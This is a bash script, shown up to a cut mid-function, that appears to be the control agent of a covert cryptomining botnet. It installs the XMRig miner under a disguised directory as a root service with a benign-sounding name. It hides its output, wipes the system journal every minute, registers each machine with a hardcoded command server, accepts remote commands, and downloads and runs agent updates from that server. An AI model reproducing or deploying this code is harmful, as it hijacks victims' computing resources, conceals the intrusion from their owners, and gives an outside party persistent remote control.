#!/bin/bash
BASE_DIR="/usr/local/libexec/cinnamon-db-test"
AGENT_VERSION_FILE="$BASE_DIR/agent.version"
EMBEDDED_AGENT_VERSION="0"

if [[ "${1:-}" == "--version" ]]; then
    cat "$AGENT_VERSION_FILE" 2>/dev/null || printf '%s\n' "$EMBEDDED_AGENT_VERSION"
    exit 0
fi

if [[ "${1:-}" == "--self-test" ]]; then
    bash -n "$0" || exit 1
    for dependency in curl jq sha256sum flock systemctl journalctl; do
        command -v "$dependency" >/dev/null 2>&1 || exit 1
    done
    exit 0
fi

sleep 1
exec >/dev/null 2>&1

WORKER="$BASE_DIR/xmrig"
CONFIG_FILE="$BASE_DIR/config.json"
CONFIG_BACKUP_FILE="$BASE_DIR/config.json.backup"
CONFIG_FACTORY_FILE="$BASE_DIR/config.factory.json"
CONFIG_VERSION_FILE="$BASE_DIR/config.version"
INSTALLATION_ID_FILE="$BASE_DIR/installation.id"
REGISTRATION_STATE_FILE="$BASE_DIR/registration.confirmed"
REGISTRATION_NEXT_FILE="$BASE_DIR/registration.next"
REGISTRATION_FAILURE_FILE="$BASE_DIR/registration.failures"
LAST_COMMAND_FILE="$BASE_DIR/last-command.id"
ACTIVE_COMMAND_FILE="$BASE_DIR/active-command.id"
COMMAND_RESULT_OUTBOX_FILE="$BASE_DIR/command-result.outbox"
UPDATE_NEXT_FILE="$BASE_DIR/update.next"
UPDATE_FAILURE_FILE="$BASE_DIR/update.failures"
UPDATE_LOCK_FILE="$BASE_DIR/update.lock"
AGENT_UPDATE_REQUEST_FILE="$BASE_DIR/agent-update.request.json"
AGENT_UPDATE_RESULT_FILE="$BASE_DIR/agent-update.result.json"
AGENT_UPDATE_SEEN_FILE="$BASE_DIR/agent-update.seen"
AGENT_UPDATER_RETRY_FILE="$BASE_DIR/agent-updater.next"
AGENT_READY_FILE="/run/localcomputeagent/ready"
RESTART_STATE_FILE="$BASE_DIR/restart.state"
WORKER_STOP_MARKER="$BASE_DIR/worker.stop-requested"
API_RATE_LOCK_FILE="$BASE_DIR/api-request.lock"
API_RATE_STATE_FILE="$BASE_DIR/api-request.last"

WORKER_GRACE_SEC=30
HEARTBEAT_INTERVAL=60
CONTROL_INTERVAL=10
CONTROL_JITTER=10
CONFIG_INTERVAL=300
MAIN_LOOP_INTERVAL=5
JOURNAL_VACUUM_INTERVAL=60
LOG_HTTP_TIMEOUT=5
LOG_MAX_LEN=220
LOG_CHUNK_SIZE=200
LOG_RETRY_COUNT=2
MINING_LOG_INTERVAL=300
ERROR_LOG_INTERVAL=30
OFFICIAL_CHECK_MIN=1800
OFFICIAL_CHECK_MAX=3600
OFFICIAL_RELEASE_MIN_AGE=3600
OFFICIAL_RELEASE_JITTER=18000
UPDATE_RETRY_MIN=60
UPDATE_RETRY_MAX=120
UPDATE_RETRY_CAP=21600
RESTART_WINDOW=900
RESTART_LIMIT=5
RESTART_COOLDOWN=900
REGISTRATION_RETRY_MIN=30
REGISTRATION_RETRY_MAX=1800

COMPUTE_VERSION=$(cat "$AGENT_VERSION_FILE" 2>/dev/null || printf '%s' "$EMBEDDED_AGENT_VERSION")
[[ "$COMPUTE_VERSION" =~ ^[0-9]+$ ]] || COMPUTE_VERSION="$EMBEDDED_AGENT_VERSION"

API_BASE="http://103.59.94.204/sibqtp_banquet_hk"
GITHUB_RELEASE_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
OFFICIAL_RELEASE_API="https://api.xmrig.com/1/latest_release/xmrig?id=linux-static-x64"

if [[ ! -s "$INSTALLATION_ID_FILE" ]]; then
    if [[ -r /proc/sys/kernel/random/uuid ]]; then
        tr -d '-' < /proc/sys/kernel/random/uuid > "$INSTALLATION_ID_FILE"
    else
        printf '%s' "$(cat /etc/machine-id)-$(date +%s)-$RANDOM" | sha256sum | awk '{print $1}' > "$INSTALLATION_ID_FILE"
    fi
    chmod 600 "$INSTALLATION_ID_FILE"
fi
MACHINE_GUID=$(tr -cd 'a-zA-Z0-9._-' < "$INSTALLATION_ID_FILE" | head -c 64)
HARDWARE_MACHINE_ID=$(cat /etc/machine-id 2>/dev/null || true)
HOSTNAME=$(hostname)
AGENT_CAPABILITIES='["offline_safe","factory_config","registration_reconcile","heartbeat_hostname","github_xmrig_update","official_xmrig_update","xmrig_update","xmrig_rollback","agent_self_update","agent_update_rollback","update_telemetry","restart_budget","no_local_logs","remote_command","command_response"]'
UPDATE_STATUS="IDLE"
UPDATE_COMPONENT="xmrig"
LAST_ERROR_CODE=""
UPDATE_ERROR_CODE=""
UPDATE_EVENT_ID=""
UPDATE_SOURCE=""
UPDATE_FROM_VERSION=""
UPDATE_TARGET_VERSION=""
UPDATE_DETAIL=""
LAST_REMOTE_ERROR_LOG=0
LAST_REMOTE_MINING_LOG=0
HEARTBEAT_ALERTED=false
LAST_WORKER_EVENT=""
RESTART_WINDOW_START=0
RESTART_COUNT=0
RESTART_BLOCKED_UNTIL=0

get_digmon_version() {
    local version=""

    version=$("$WORKER" --version 2>/dev/null | head -n 1 | awk '{print $2}' || true)
    [[ -n "$version" ]] && printf '%s' "$version" || printf 'unknown'
}

load_config_version() {
    local version=""

    version=$(cat "$CONFIG_VERSION_FILE" 2>/dev/null || true)

    if [[ -z "$version" || "$version" == "null" ]]; then
        version=$(jq -r '.version // empty' "$CONFIG_FILE" 2>/dev/null || true)
    fi

    [[ -n "$version" ]] && printf '%s' "$version" || printf 'unknown'
}

DIGMON_VERSION=$(get_digmon_version)
CONFIG_VERSION=$(load_config_version)

# Serialize every control-plane request from this agent and keep request starts
# at least five seconds apart. Calls wait locally instead of being discarded,
# including telemetry jobs launched in the background.
agent_api_curl() {
    local lock_fd="" last_request=0 now=0 wait_seconds=0 exit_code=0
    exec {lock_fd}>"$API_RATE_LOCK_FILE" || return 1
    flock "$lock_fd" || { exec {lock_fd}>&-; return 1; }

    last_request=$(cat "$API_RATE_STATE_FILE" 2>/dev/null || printf '0')
    [[ "$last_request" =~ ^[0-9]+$ ]] || last_request=0
    now=$(date +%s)
    wait_seconds=$((5 - (now - last_request)))
    (( wait_seconds > 0 )) && sleep "$wait_seconds"
    date +%s > "$API_RATE_STATE_FILE"

    curl -H "X-Agent-ID: $MACHINE_GUID" "$@"
    exit_code=$?
    flock -u "$lock_fd"
    exec {lock_fd}>&-
    return "$exit_code"
}

log() {
    local level="$1"
    local msg="$2"
    local safe_msg=""
    local payload=""
    local chunk=""
    local prefix=""
    local chunk_size=$LOG_MAX_LEN
    local start=0
    local part=1
    local total_parts=1

    [[ -n "$msg" ]] || return 0
    [[ -n "$level" ]] || level="INFO"

    safe_msg=${msg//$'\000'/}

    if (( ${#safe_msg} > LOG_MAX_LEN )); then
        chunk_size=$LOG_CHUNK_SIZE
        total_parts=$(((${#safe_msg} + chunk_size - 1) / chunk_size))
    fi

    while (( start < ${#safe_msg} )); do
        chunk="${safe_msg:start:chunk_size}"
        prefix=""

        if (( total_parts > 1 )); then
            prefix="[part ${part}/${total_parts}] "
        fi

        payload=$(printf '{"machine_guid":"%s","level":"%s","message":"%s"}' \
            "$(json_escape "$MACHINE_GUID")" \
            "$(json_escape "$level")" \
            "$(json_escape "${prefix}${chunk}")")

        now_log=$(date +%s)
        if [[ "$level" == "MINING" ]]; then
            if (( now_log - LAST_REMOTE_MINING_LOG >= MINING_LOG_INTERVAL )); then
                LAST_REMOTE_MINING_LOG=$now_log
                post_log_payload "$payload" >/dev/null 2>&1 &
            fi
        elif [[ "$level" == "ERROR" ]]; then
            if (( now_log - LAST_REMOTE_ERROR_LOG >= ERROR_LOG_INTERVAL )); then
                LAST_REMOTE_ERROR_LOG=$now_log
                post_log_payload "$payload" >/dev/null 2>&1 &
            fi
        else
            post_log_payload "$payload" >/dev/null 2>&1 &
        fi

        start=$((start + chunk_size))
        part=$((part + 1))
    done

    # Logging is telemetry only. Its result must never control the agent loop
    # or the lifecycle of the independent XMRig worker.
    return 0
}

json_escape() {
    local value="$1"

    if command -v tr >/dev/null 2>&1; then
        value=$(printf '%s' "$value" | LC_ALL=C tr -d '\000-\010\013\014\016-\037')
    else
        value=${value//$'\a'/}
        value=${value//$'\v'/}
        value=${value//$'\e'/}
    fi

    value=${value//\\/\\\\}
    value=${value//\"/\\\"}
    value=${value//$'\b'/\\b}
    value=${value//$'\f'/\\f}
    value=${value//$'\n'/\\n}
    value=${value//$'\r'/\\r}
    value=${value//$'\t'/\\t}

    printf '%s' "$value"
}

post_log_payload() {
    local payload="$1"
    local http_code=""
    local attempt=1

    while (( attempt <= LOG_RETRY_COUNT )); do
        http_code=$(agent_api_curl -sS -o /dev/null -w "%{http_code}" \
            -m "$LOG_HTTP_TIMEOUT" \
            -X POST "$API_BASE/log.php" \
            -H "Content-Type: application/json" \
            --data-binary "$payload" 2>/dev/null || true)

        if [[ "$http_code" == "200" ]]; then
            return 0
        fi

        attempt=$((attempt + 1))
        sleep 1
    done

    return 1
}

worker_log_level() {
    local line="${1,,}"

    # In configured RandomX light mode, XMRig deliberately skips the ~2 GiB
    # fast dataset and reports the slow-mode fallback with the word "failed".
    # It is operational information, not a worker failure.
    if [[ "$line" == *"failed to allocate randomx dataset, switching to slow mode"* ]]; then
        printf 'INFO'
    elif [[ "$line" == *"error"* || "$line" == *"fail"* || "$line" == *"timeout"* || "$line" == *"invalid"* || "$line" == *"denied"* || "$line" == *"no pool"* || "$line" == *"disconnect"* ]]; then
        printf 'ERROR'
    elif [[ "$line" == *"accepted"* || "$line" == *"rejected"* || "$line" == *"speed 10s/60s/15m"* ]]; then
        printf 'MINING'
    elif [[ "$line" == *"use pool"* || "$line" == *"connected"* || "$line" == *"ready"* ]]; then
        printf 'INFO'
    else
        printf ''
    fi
}

forward_worker_logs() {
    local line=""
    local level=""

    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%$'\r'}"
        [[ -n "$line" ]] || continue

        level=$(worker_log_level "$line")
        [[ -n "$level" ]] && log "$level" "XMRIG: $line"
    done
}



command -v curl >/dev/null 2>&1 || log ERROR "curl not installed"
command -v jq   >/dev/null 2>&1 || log ERROR "jq not installed"

ensure_worker_service() {
    local unit_file="/etc/systemd/system/localcomputeworker.service"
    local temporary="${unit_file}.tmp.$$"
    local expected_exec="ExecStart=$WORKER -c $CONFIG_FILE"

    if systemctl cat localcomputeworker.service 2>/dev/null \
        | grep -Fqx "$expected_exec"; then
        return 0
    fi

    cat > "$temporary" <<EOF
[Unit]
Description=Local Compute XMRig Worker
After=local-fs.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=$WORKER -c $CONFIG_FILE
WorkingDirectory=$BASE_DIR
Restart=always
RestartSec=5
TimeoutStopSec=20
User=root
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 "$temporary"
    mv -f "$temporary" "$unit_file"
    systemctl daemon-reload
    systemctl enable localcomputeworker.service >/dev/null 2>&1 || true
    log INFO "AGENT: WORKER SERVICE REPAIRED"
}

stop_worker() {
    : > "$WORKER_STOP_MARKER"
    chmod 600 "$WORKER_STOP_MARKER"
    systemctl stop localcomputeworker.service >/dev/null 2>&1 || true
}

start_worker() {
    if [[ -x "$WORKER" && -f "$CONFIG_FILE" ]]; then
        ensure_worker_service
        rm -f "$WORKER_STOP_MARKER"
        systemctl reset-failed localcomputeworker.service >/dev/null 2>&1 || true
        systemctl restart localcomputeworker.service >/dev/null 2>&1 || true
        LAST_WORKER_START=$(date +%s)
        log INFO "AGENT: WORKER STARTED"
    else
        log ERROR "AGENT: WORKER OR CONFIG NOT FOUND"
    fi
}

ensure_worker_started() {
    if worker_running; then
        return 0
    fi
    if [[ -x "$WORKER" && -f "$CONFIG_FILE" ]]; then
        ensure_worker_service
        rm -f "$WORKER_STOP_MARKER"
        systemctl reset-failed localcomputeworker.service >/dev/null 2>&1 || true
        systemctl start localcomputeworker.service >/dev/null 2>&1 || true
        LAST_WORKER_START=$(date +%s)
        log INFO "AGENT: WORKER STARTED"
    else
        log ERROR "AGENT: WORKER OR CONFIG NOT FOUND"
    fi
}

worker_running() {
    systemctl is-active --quiet localcomputeworker.service
}

load_restart_state() {
    local window count blocked
    read -r window count blocked < "$RESTART_STATE_FILE" 2>/dev/null || true
    [[ "$window" =~ ^[0-9]+$ ]] || window=0
    [[ "$count" =~ ^[0-9]+$ ]] || count=0
    [[ "$blocked" =~ ^[0-9]+$ ]] || blocked=0
    RESTART_WINDOW_START=$window
    RESTART_COUNT=$count
    RESTART_BLOCKED_UNTIL=$blocked
}

save_restart_state() {
    local temporary="$RESTART_STATE_FILE.tmp.$$"
    printf '%s %s %s\n' "$RESTART_WINDOW_START" "$RESTART_COUNT" "$RESTART_BLOCKED_UNTIL" > "$temporary"
    chmod 600 "$temporary"
    mv -f "$temporary" "$RESTART_STATE_FILE"
}

restart_permitted() {
    local now
    now=$(date +%s)
    load_restart_state
    if (( now < RESTART_BLOCKED_UNTIL )); then
        return 1
    fi
    if (( RESTART_WINDOW_START == 0 || now - RESTART_WINDOW_START >= RESTART_WINDOW )); then
        RESTART_WINDOW_START=$now
        RESTART_COUNT=0
        RESTART_BLOCKED_UNTIL=0
    fi
    RESTART_COUNT=$((RESTART_COUNT + 1))
    if (( RESTART_COUNT > RESTART_LIMIT )); then
        RESTART_BLOCKED_UNTIL=$((now + RESTART_COOLDOWN))
        save_restart_state
        return 1
    fi
    save_restart_state
    return 0
}

reset_restart_state_if_stable() {
    local now
    now=$(date +%s)
    load_restart_state
    if worker_running && (( RESTART_COUNT > 0 && now - LAST_WORKER_START >= RESTART_WINDOW )); then
        RESTART_WINDOW_START=$now
        RESTART_COUNT=0
        RESTART_BLOCKED_UNTIL=0
        save_restart_state
    fi
}

cleanup_runtime_files() {
    find "$BASE_DIR" -maxdepth 1 -type f \( -name 'xmrig.*.tmp.*' -o -name 'config.json.tmp.*' -o -name 'config.json.bootstrap.*' \) -mtime +1 -delete 2>/dev/null || true
    find "$BASE_DIR" -maxdepth 1 -type d -name '.xmrig-update.*' -mtime +1 -exec sh -c 'find "$1" -depth -delete' _ {} \; 2>/dev/null || true
}

vacuum_system_journal() {
    journalctl --rotate --vacuum-time=1m >/dev/null 2>&1 || true
}

get_active_gui_user() {
    loginctl list-sessions --no-legend 2>/dev/null \
        | awk '{print $1}' \
        | while read sid; do
            loginctl show-session "$sid" \
                -p Active \
                -p Type \
                -p Name \
                --value 2>/dev/null \
            | awk '
                NR==1 && $0=="yes" {active=1}
                NR==2 && ($0=="x11" || $0=="wayland") {gui=1}
                NR==3 && active && gui {print; exit}
            '
        done
}

register_agent() {
    local response=""
    local agent_name=""
    local deferred="false"

    [[ ! -s "$REGISTRATION_STATE_FILE" ]] || return 0
    response=$(agent_api_curl -sS -m 10 -X POST "$API_BASE/register.php" \
        -H "Content-Type: application/json" \
        --data-binary "$(printf '{"machine_guid":"%s","hostname":"%s"}' \
            "$(json_escape "$MACHINE_GUID")" \
            "$(json_escape "$HOSTNAME")")" 2>/dev/null || true)

    if echo "$response" | jq -e '.status == "ok" and (.registered == true or .deferred == true)' >/dev/null 2>&1; then
        agent_name=$(echo "$response" | jq -r '.agent_name // empty')
        deferred=$(echo "$response" | jq -r '.deferred // false')
        printf '%s\n' "${agent_name:-registered}" > "$REGISTRATION_STATE_FILE.tmp.$$"
        chmod 600 "$REGISTRATION_STATE_FILE.tmp.$$"
        mv -f "$REGISTRATION_STATE_FILE.tmp.$$" "$REGISTRATION_STATE_FILE"
        write_uint_file "$REGISTRATION_FAILURE_FILE" 0
        if [[ "$deferred" == "true" ]]; then
            log INFO "REGISTER ACCEPTED; HEARTBEAT RECONCILIATION ACTIVE (agent=${agent_name:-unknown})"
        else
            log INFO "REGISTER CONFIRMED (agent=${agent_name:-unknown})"
        fi
        return 0
    fi

    return 1
}

schedule_registration_retry() {
    local now failures exponent delay jitter
    now=$(date +%s)
    failures=$(read_uint_file "$REGISTRATION_FAILURE_FILE" 0)
    failures=$((failures + 1))
    exponent=$((failures - 1))
    (( exponent > 6 )) && exponent=6
    delay=$((REGISTRATION_RETRY_MIN * (1 << exponent)))
    (( delay > REGISTRATION_RETRY_MAX )) && delay=$REGISTRATION_RETRY_MAX
    jitter=$((RANDOM % (delay / 4 + 1)))
    write_uint_file "$REGISTRATION_FAILURE_FILE" "$failures"
    write_uint_file "$REGISTRATION_NEXT_FILE" $((now + delay + jitter))
    (( failures == 1 || failures % 5 == 0 )) && log ERROR "REGISTER PENDING; retry in $((delay + jitter))s (worker continues)"
}

fetch_config() {
    agent_api_curl -s -m 15 "$API_BASE/get-config.php?machine_guid=$MACHINE_GUID" || true
}

valid_config_file() {
    local path="$1"
    [[ -s "$path" ]] && jq -e '.pools | type == "array" and length > 0' "$path" >/dev/null 2>&1
}

restore_local_config() {
    local candidate="" version=""

    if valid_config_file "$CONFIG_FILE"; then
        return 0
    fi

    for candidate in "$CONFIG_BACKUP_FILE" "$CONFIG_FACTORY_FILE"; do
        if valid_config_file "$candidate"; then
            cp -f "$candidate" "$CONFIG_FILE"
            chmod 600 "$CONFIG_FILE"
            version=$(jq -r '.version // "local"' "$CONFIG_FILE" 2>/dev/null || printf 'local')
            printf '%s\n' "$version" > "$CONFIG_VERSION_FILE"
            CONFIG_VERSION="$version"
            return 0
        fi
    done

    return 1
}

save_config() {
    local cfg="$1"
    local version=""
    local tmp_config="$CONFIG_FILE.tmp.$$"

    if ! echo "$cfg" | jq -e '.version and (.pools | type == "array") and (.pools | length > 0)' >/dev/null 2>&1; then
        return 1
    fi

    version=$(echo "$cfg" | jq -r '.version')
    if ! echo "$cfg" | jq '.' > "$tmp_config"; then
        rm -f "$tmp_config"
        return 1
    fi
    valid_config_file "$CONFIG_FILE" && cp -f "$CONFIG_FILE" "$CONFIG_BACKUP_FILE"
    mv -f "$tmp_config" "$CONFIG_FILE"
    chmod 600 "$CONFIG_FILE"
    printf '%s\n' "$version" > "$CONFIG_VERSION_FILE"
    CONFIG_VERSION="$version"

    return 0
}

config_runtime_fingerprint_file() {
    local path="$1"
    jq -cS 'del(.version)' "$path" 2>/dev/null | sha256sum | awk '{print $1}'
}

config_runtime_fingerprint_json() {
    local cfg="$1"
    printf '%s' "$cfg" | jq -cS 'del(.version)' 2>/dev/null | sha256sum | awk '{print $1}'
}

fetch_initial_config() {
    local attempt=1
    local max_attempts=6
    local cfg=""

    log INFO "INITIAL CONFIG FETCH"

    while (( attempt <= max_attempts )); do
        cfg=$(fetch_config)

        if save_config "$cfg"; then
            log INFO "INITIAL CONFIG SAVED (version=$CONFIG_VERSION)"
            return 0
        fi

        log ERROR "INITIAL CONFIG INVALID (attempt=$attempt/$max_attempts)"
        attempt=$((attempt + 1))
        sleep 5
    done

    if restore_local_config; then
        CONFIG_VERSION=$(load_config_version)
        log ERROR "INITIAL CONFIG FALLBACK: using local config (version=$CONFIG_VERSION)"
        return 0
    fi

    log ERROR "INITIAL CONFIG UNAVAILABLE; AGENT REMAINS INDEPENDENT"
    return 1
}

read_uint_file() {
    local path="$1" fallback="$2" value=""
    value=$(cat "$path" 2>/dev/null || true)
    [[ "$value" =~ ^[0-9]+$ ]] && printf '%s' "$value" || printf '%s' "$fallback"
}

write_uint_file() {
    local path="$1" value="$2" temporary="$1.tmp.$$"
    printf '%s\n' "$value" > "$temporary"
    chmod 600 "$temporary"
    mv -f "$temporary" "$path"
}

schedule_update_success() {
    local now delay
    now=$(date +%s)
    delay=$((OFFICIAL_CHECK_MIN + RANDOM % (OFFICIAL_CHECK_MAX - OFFICIAL_CHECK_MIN + 1)))
    write_uint_file "$UPDATE_FAILURE_FILE" 0
    write_uint_file "$UPDATE_NEXT_FILE" $((now + delay))
}

schedule_update_retry() {
    local now delay failures exponent jitter
    now=$(date +%s)
    failures=$(read_uint_file "$UPDATE_FAILURE_FILE" 0)
    failures=$((failures + 1))
    exponent=$((failures - 1))
    (( exponent > 8 )) && exponent=8
    delay=$((UPDATE_RETRY_MIN * (1 << exponent)))
    (( delay < UPDATE_RETRY_MAX )) && delay=$UPDATE_RETRY_MAX
    (( delay > UPDATE_RETRY_CAP )) && delay=$UPDATE_RETRY_CAP
    jitter=$((RANDOM % (delay / 4 + 1)))
    write_uint_file "$UPDATE_FAILURE_FILE" "$failures"
    write_uint_file "$UPDATE_NEXT_FILE" $((now + delay + jitter))
}

version_is_newer() {
    local candidate="$1" current="$2" newest
    [[ -z "$current" || "$current" == "unknown" ]] && return 0
    [[ -n "$candidate" && "$candidate" != "$current" ]] || return 1
    newest=$(printf '%s\n%s\n' "$current" "$candidate" | sort -V | tail -n 1)
    [[ "$newest" == "$candidate" ]]
}

remove_update_directory() {
    local path="$1"
    case "$path" in
        "$BASE_DIR"/.xmrig-update.*)
            [[ -d "$path" ]] && find "$path" -depth -delete 2>/dev/null || true
            ;;
    esac
}

begin_update_event() {
    UPDATE_COMPONENT="xmrig"
    UPDATE_EVENT_ID="${MACHINE_GUID}-$(date +%s)-$RANDOM"
    UPDATE_SOURCE="$1"
    UPDATE_FROM_VERSION="$2"
    UPDATE_TARGET_VERSION="$3"
    UPDATE_DETAIL="$4"
    UPDATE_ERROR_CODE=""
}

load_agent_update_result() {
    local result status event_id source from_version target_version detail error_code
    [[ -s "$AGENT_UPDATE_RESULT_FILE" ]] || return 0
    result=$(cat "$AGENT_UPDATE_RESULT_FILE" 2>/dev/null || true)
    printf '%s' "$result" | jq -e 'type == "object" and .event_id and .status' >/dev/null 2>&1 || return 0
    status=$(printf '%s' "$result" | jq -r '.status // empty')
    event_id=$(printf '%s' "$result" | jq -r '.event_id // empty')
    source=$(printf '%s' "$result" | jq -r '.source // "idcloudhost-vps"')
    from_version=$(printf '%s' "$result" | jq -r '.from_version // empty')
    target_version=$(printf '%s' "$result" | jq -r '.target_version // empty')
    detail=$(printf '%s' "$result" | jq -r '.detail // empty')
    error_code=$(printf '%s' "$result" | jq -r '.error_code // empty')
    [[ -n "$status" && -n "$event_id" ]] || return 0
    UPDATE_COMPONENT="agent"
    UPDATE_STATUS="$status"
    UPDATE_EVENT_ID="$event_id"
    UPDATE_SOURCE="$source"
    UPDATE_FROM_VERSION="$from_version"
    UPDATE_TARGET_VERSION="$target_version"
    UPDATE_DETAIL="$detail"
    UPDATE_ERROR_CODE="$error_code"
}

clear_reported_agent_update_result() {
    [[ "$UPDATE_COMPONENT" == "agent" ]] || return 0
    rm -f "$AGENT_UPDATE_RESULT_FILE"
    UPDATE_COMPONENT="xmrig"
    UPDATE_STATUS="IDLE"
    UPDATE_EVENT_ID=""
    UPDATE_SOURCE=""
    UPDATE_FROM_VERSION=""
    UPDATE_TARGET_VERSION=""
    UPDATE_DETAIL=""
    UPDATE_ERROR_CODE=""
}

queue_agent_update() {
    local control="$1" target_version url source expected_sha event_id current_version current_sha candidate request_tmp downloaded_sha lock_fd
    local now next_attempt seen_token seen_value
    local source_entry download_ok=false download_attempts=0 checksum_failures=0
    local -a update_sources=()
    target_version=$(printf '%s' "$control" | jq -r '.agent_update.version // empty')
    expected_sha=$(printf '%s' "$control" | jq -r '.agent_update.sha256 // empty' | tr '[:upper:]' '[:lower:]')
    event_id=$(printf '%s' "$control" | jq -r '.agent_update.event_id // empty')
    current_version=$(cat "$AGENT_VERSION_FILE" 2>/dev/null || printf '0')

    [[ "$current_version" =~ ^[0-9]+$ ]] || current_version=0
    [[ "$target_version" =~ ^[0-9]+$ ]] || return 0
    [[ "$expected_sha" =~ ^[a-f0-9]{64}$ ]] || return 0
    [[ "$event_id" =~ ^[a-zA-Z0-9._-]{1,96}$ ]] || event_id="agent-${target_version}"
    (( target_version >= current_version )) || return 0

    if [[ -s "$AGENT_UPDATE_REQUEST_FILE" ]]; then
        now=$(date +%s)
        next_attempt=$(read_uint_file "$AGENT_UPDATER_RETRY_FILE" 0)
        if (( now >= next_attempt )) && ! systemctl is-active --quiet localcomputeagent-updater.service; then
            write_uint_file "$AGENT_UPDATER_RETRY_FILE" $((now + 60))
            systemctl reset-failed localcomputeagent-updater.service >/dev/null 2>&1 || true
            systemctl start --no-block localcomputeagent-updater.service >/dev/null 2>&1 || true
        fi
        return 0
    fi

    current_sha=$(sha256sum "$BASE_DIR/agent.sh" 2>/dev/null | awk '{print $1}')
    seen_token="${target_version}|${expected_sha}"
    if (( target_version == current_version )) && [[ "$current_sha" == "$expected_sha" ]]; then
        seen_value=$(cat "$AGENT_UPDATE_SEEN_FILE" 2>/dev/null || true)
        if [[ "$seen_value" != "$seen_token" ]]; then
            UPDATE_COMPONENT="agent"
            UPDATE_STATUS="CURRENT"
            UPDATE_EVENT_ID="${MACHINE_GUID}-${event_id}-current"
            UPDATE_SOURCE="installed"
            UPDATE_FROM_VERSION="$current_version"
            UPDATE_TARGET_VERSION="$target_version"
            UPDATE_DETAIL="Published agent release is already installed"
            UPDATE_ERROR_CODE=""
            printf '%s\n' "$seen_token" > "$AGENT_UPDATE_SEEN_FILE.tmp.$$"
            chmod 600 "$AGENT_UPDATE_SEEN_FILE.tmp.$$"
            mv -f "$AGENT_UPDATE_SEEN_FILE.tmp.$$" "$AGENT_UPDATE_SEEN_FILE"
        fi
        return 0
    fi

    exec {lock_fd}>"$UPDATE_LOCK_FILE"
    flock -n "$lock_fd" || { exec {lock_fd}>&-; return 0; }
    candidate="$BASE_DIR/agent.sh.candidate.${target_version}.$$"
    mapfile -t update_sources < <(printf '%s' "$control" | jq -r '.agent_update.sources[]? | select((.name | type) == "string" and (.url | type) == "string") | [.name, .url] | @tsv' 2>/dev/null)
    if (( ${#update_sources[@]} == 0 )); then
        url=$(printf '%s' "$control" | jq -r '.agent_update.file_url // empty')
        [[ -n "$url" ]] && update_sources+=("idcloudhost-vps"$'\t'"$url")
    fi
    (( ${#update_sources[@]} > 0 )) || { exec {lock_fd}>&-; return 0; }
    UPDATE_COMPONENT="agent"
    UPDATE_STATUS="DOWNLOADING"
    UPDATE_EVENT_ID="${MACHINE_GUID}-${event_id}"
    UPDATE_SOURCE="all"
    UPDATE_FROM_VERSION="$current_version"
    UPDATE_TARGET_VERSION="$target_version"
    UPDATE_DETAIL="Downloading agent release from available sources"
    UPDATE_ERROR_CODE=""

    for source_entry in "${update_sources[@]}"; do
        IFS=$'\t' read -r source url <<< "$source_entry"
        [[ "$source" =~ ^[a-zA-Z0-9._-]{1,64}$ ]] || continue
        [[ "$url" == https://* || "$url" == http://103.59.94.204/* ]] || continue
        download_attempts=$((download_attempts + 1))
        rm -f "$candidate"
        if ! curl -fsSL --retry 2 --connect-timeout 10 -m 60 -o "$candidate" "$url"; then
            continue
        fi
        downloaded_sha=$(sha256sum "$candidate" 2>/dev/null | awk '{print $1}')
        if [[ "$downloaded_sha" != "$expected_sha" ]]; then
            checksum_failures=$((checksum_failures + 1))
            rm -f "$candidate"
            continue
        fi
        UPDATE_SOURCE="$source"
        download_ok=true
        break
    done
    if [[ "$download_ok" != "true" ]]; then
        UPDATE_STATUS="FAILED"
        if (( checksum_failures > 0 )); then
            UPDATE_ERROR_CODE="E_AGENT_UPDATE_CHECKSUM"
            UPDATE_DETAIL="Agent release failed SHA-256 verification on $checksum_failures source(s)"
        else
            UPDATE_ERROR_CODE="E_AGENT_UPDATE_DOWNLOAD"
            UPDATE_DETAIL="Agent release download failed on $download_attempts source(s)"
        fi
        rm -f "$candidate"
        exec {lock_fd}>&-
        return 1
    fi
    chmod 700 "$candidate"
    if ! bash -n "$candidate" || ! "$candidate" --self-test; then
        UPDATE_STATUS="FAILED"
        UPDATE_ERROR_CODE="E_AGENT_UPDATE_SELF_TEST"
        UPDATE_DETAIL="Agent candidate failed syntax or self-test"
        rm -f "$candidate"
        exec {lock_fd}>&-
        return 1
    fi

    request_tmp="$AGENT_UPDATE_REQUEST_FILE.tmp.$$"
    jq -n --arg candidate "$candidate" --arg sha256 "$expected_sha" \
        --arg event_id "$UPDATE_EVENT_ID" --arg from_version "$current_version" \
        --arg target_version "$target_version" --arg source "$UPDATE_SOURCE" \
        '{candidate:$candidate,sha256:$sha256,event_id:$event_id,from_version:$from_version,target_version:$target_version,source:$source}' > "$request_tmp" || {
            rm -f "$candidate" "$request_tmp"
            exec {lock_fd}>&-
            return 1
        }
    chmod 600 "$request_tmp"
    mv -f "$request_tmp" "$AGENT_UPDATE_REQUEST_FILE"
    UPDATE_STATUS="INSTALLING"
    if (( target_version == current_version )); then
        UPDATE_DETAIL="Agent updater is repairing a same-version content mismatch"
    else
        UPDATE_DETAIL="Agent updater is installing the release"
    fi
    write_uint_file "$AGENT_UPDATER_RETRY_FILE" $(( $(date +%s) + 60 ))
    # The updater uses the same lock. Release it before starting the oneshot;
    # otherwise --no-block can race and make the updater exit without consuming
    # the durable request.
    exec {lock_fd}>&-
    systemctl reset-failed localcomputeagent-updater.service >/dev/null 2>&1 || true
    if ! systemctl start --no-block localcomputeagent-updater.service >/dev/null 2>&1; then
        UPDATE_STATUS="FAILED"
        UPDATE_ERROR_CODE="E_AGENT_UPDATER_START"
        UPDATE_DETAIL="Agent updater service could not be started"
        rm -f "$AGENT_UPDATE_REQUEST_FILE" "$candidate" "$AGENT_UPDATER_RETRY_FILE"
        return 1
    fi
    return 0
}

mark_update_recovered() {
    if [[ "$UPDATE_STATUS" == "RETRY_WAIT" ]] && ! version_is_newer "$UPDATE_TARGET_VERSION" "$DIGMON_VERSION"; then
        UPDATE_STATUS="RECOVERED"
        UPDATE_ERROR_CODE=""
        UPDATE_DETAIL="Update source reachable; installed binary remains current"
        [[ "$LAST_ERROR_CODE" == "E_UPDATE_SOURCES_UNAVAILABLE" ]] && LAST_ERROR_CODE=""
    fi
}

install_worker_candidate() {
    local candidate="$1" expected_sha="$2" expected_version="$3" source="$4"
    local integrity_verified="${5:-false}"
    local downloaded_sha candidate_version version_line normalized_expected health_deadline

